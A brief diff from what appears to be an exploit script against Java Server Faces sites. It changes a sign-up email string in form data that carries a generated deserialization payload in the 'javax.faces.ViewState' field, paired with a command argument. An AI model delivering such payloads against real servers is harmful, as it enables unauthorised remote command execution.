@@ -52,7 +52,7 @@ def generate(name, cmd):
         if payload_result != "":
             data = {
               'j_id_jsp_1623871077_1_SUBMIT': '1',
-              'j_id_jsp_1623871077_1:email': 'olololo@mail.com',
+              'j_id_jsp_1623871077_1:email': 'freenetwork_pwnd@mail.com',
               'j_id_jsp_1623871077_1:submit': 'SIGN+UP',
               'javax.faces.ViewState': '{}'.format(payload_result)
             }
